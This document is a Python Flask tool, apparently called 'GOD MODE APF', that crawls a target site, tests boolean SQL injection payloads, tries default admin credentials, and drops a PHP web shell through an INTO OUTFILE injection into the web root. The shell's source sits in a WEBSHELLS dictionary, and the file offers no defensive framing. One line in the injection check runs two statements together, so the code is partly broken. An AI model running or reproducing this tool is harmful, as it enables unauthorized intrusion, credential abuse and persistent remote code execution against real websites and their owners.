#!/usr/bin/env python3
import os, json, time, threading, re
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, quote
import requests
from bs4 import BeautifulSoup
import urllib3
from flask import Flask, jsonify, request

stats_lock = threading.Lock()
results_lock = threading.Lock()
stats = {"endpoints": 0, "sqli": 0, "sqli_vuln": 0, "logins": 0, "shells": 0, "rce": 0, "keys": 0, "files": 0}
results = {"sqli": [], "logins": [], "shells": [], "files": []}

SQLI_PAYLOADS = {"boolean": ["' OR 1=1--", "' OR 'a'='a", "1' OR '1'='1"]}
DEFAULT_CREDS = [("admin","admin"), ("admin","password")]
COMMON_PATHS = ["/login", "/admin"]
WEBSHELLS = {"god.php": "<?php if(isset($_GET['p']) && $_GET['p']=='god'){@eval($_POST['c']);}echo 'GOD_MODE';?>"}

def safe_request(url, method="GET", **kwargs):
    try:
        headers = {"User-Agent": "Mozilla/5.0 Chrome/120.0.0.0"}
        headers.update(kwargs.get('headers', {}))
        kwargs['headers'] = headers
        urllib3.disable_warnings()
        return requests.request(method, url, timeout=10, verify=False, **kwargs)
    except:
        return None

def find_endpoints(target):
    endpoints = []
    r = safe_request(target)
    if not r:
        return endpoints
    soup = BeautifulSoup(r.text, "html.parser")
    for form in soup.find_all("form"):
        action = form.get("action", "") or target
        for inp in form.find_all("input", {"name": True}):
            endpoints.append(f"{action}?{inp['name']}=1")
    params = re.findall(r'[\?&]([^=]+)=', r.text)
    for param in set(params):
        if len(param) < 20:
            endpoints.append(f"{target}?{param}=1")
    return list(set(endpoints))[:50]

def detect_sqli(url, param):
    types = []
    base_url = url.split('?')[0]
    for p in SQLI_PAYLOADS["boolean"]:
        test_url = f"{base_url}?{param}={quote(p)}"        r1 = safe_request(test_url)
        r2 = safe_request(f"{base_url}?{param}=1")
        if r1 and r2 and len(r1.text) != len(r2.text):
            types.append("boolean")
            break
    if types:
        with stats_lock:
            stats["sqli_vuln"] += 1
        with results_lock:
            results["sqli"].append({"url": url, "param": param, "type": types[0]})
    else:
        with stats_lock:
            stats["sqli"] += 1
    return types

def test_creds(target):
    for path in COMMON_PATHS:
        url = urljoin(target, path)
        for user, pwd in DEFAULT_CREDS:
            try:
                r = safe_request(url, auth=(user, pwd))
                if r and r.status_code == 200:
                    with stats_lock:
                        stats["logins"] += 1
                    with results_lock:
                        results["logins"].append(f"{user}:{pwd}@{url}")
            except:
                pass

def process_target(target, endpoint):
    param = endpoint.split('=')[0].split('?')[-1]
    sqli_types = detect_sqli(endpoint, param)
    if sqli_types:
        base_url = endpoint.split('?')[0]
        for name, content in WEBSHELLS.items():
            payload = f"UNION SELECT '{content}' INTO OUTFILE '/var/www/html/{name}'--"
            safe_request(f"{base_url}?{param}={quote(payload)}")
            shell_url = urljoin(base_url, name)
            r_check = safe_request(shell_url)
            if r_check and 'GOD_MODE' in r_check.text:
                with stats_lock:
                    stats["shells"] += 1
                with results_lock:
                    results["shells"].append(shell_url)

app = Flask(__name__)

@app.route('/')
def serve_ui():
    return open('index.html', 'r').read()
@app.route('/api/stats')
def get_stats():
    with stats_lock:
        sc = stats.copy()
    with results_lock:
        rc = {k: v.copy() for k, v in results.items()}
    return jsonify({"target": "Belum Ada Target", "stats": sc, "results": rc})

@app.route('/api/run_scan', methods=['POST'])
def run_scan_api():
    target = request.json.get('target')
    if not target:
        return jsonify({"error": "Target kosong"}), 400
    
    def scan_thread():
        global stats, results
        with stats_lock:
            stats = {k: 0 for k in stats}
        with results_lock:
            results = {k: [] for k in results}
        
        endpoints = find_endpoints(target)
        with stats_lock:
            stats["endpoints"] = len(endpoints)
        
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(process_target, target, ep) for ep in endpoints]
            for f in futures:
                try:
                    f.result()
                except:
                    pass
        
        test_creds(target)
    
    threading.Thread(target=scan_thread, daemon=True).start()
    return jsonify({"message": f"Scan {target} dimulai"})

if __name__ == "__main__":
    print("=" * 50)
    print("GOD MODE APF - PYDROID 3")
    print("=" * 50)
    print("[+] Server: http://127.0.0.1:5000")
    print("=" * 50)
    app.run(host='127.0.0.1', port=5000, debug=False)
